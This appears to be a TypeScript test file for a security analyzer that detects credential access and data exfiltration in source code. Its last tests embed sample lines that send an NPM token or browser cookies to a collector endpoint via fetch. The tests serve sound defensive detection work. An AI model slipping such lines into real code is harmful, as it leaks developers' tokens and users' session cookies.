import test from 'node:test';
import assert from 'node:assert/strict';
import { analyzeContent } from './analyzer.js';

function patternIdsFor(source: string): string[] {
  return analyzeContent(source).findings.map((finding) => finding.patternId);
}

test('does not flag benign dynamic fetch wrapper parameters', () => {
  const ids = patternIdsFor(`
    export async function getJson(url: string) {
      const response = await fetch(url, { method: "GET" });
      return response.json();
    }
  `);

  assert.equal(ids.includes('EXFIL_FETCH_DYNAMIC'), false);
});

test('does not flag benign API URL configuration from environment', () => {
  const ids = patternIdsFor(`
    const baseUrl = process.env.API_URL;
    export const client = { baseUrl };
  `);

  assert.equal(ids.includes('CRED_ENV_ACCESS'), false);
});

test('does not flag common public frontend environment configuration', () => {
  const ids = patternIdsFor(`
    const endpoint = process.env.NEXT_PUBLIC_API_URL || process.env.VITE_API_ENDPOINT;
    fetch(endpoint);
  `);

  assert.equal(ids.includes('CRED_ENV_ACCESS'), false);
  assert.equal(ids.includes('EXFIL_FETCH_DYNAMIC'), false);
});

test('still flags dynamic fetches that include environment secrets', () => {
  const ids = patternIdsFor(`
    const target = getCollectorUrl();
    fetch(target + "?token=" + process.env.NPM_TOKEN);
  `);

  assert.ok(ids.includes('EXFIL_FETCH_DYNAMIC'));
  assert.ok(ids.includes('CRED_ENV_ACCESS'));
});

test('still flags dynamic fetches that send browser credentials', () => {
  const ids = patternIdsFor(`
    fetch(endpoint, { method: "POST", body: document.cookie });
  `);

  assert.ok(ids.includes('EXFIL_FETCH_DYNAMIC'));
});

test('still flags token-like environment variable access', () => {
  const ids = patternIdsFor(`
    const token = process.env.GITHUB_TOKEN;
  `);

  assert.ok(ids.includes('CRED_ENV_ACCESS'));
});
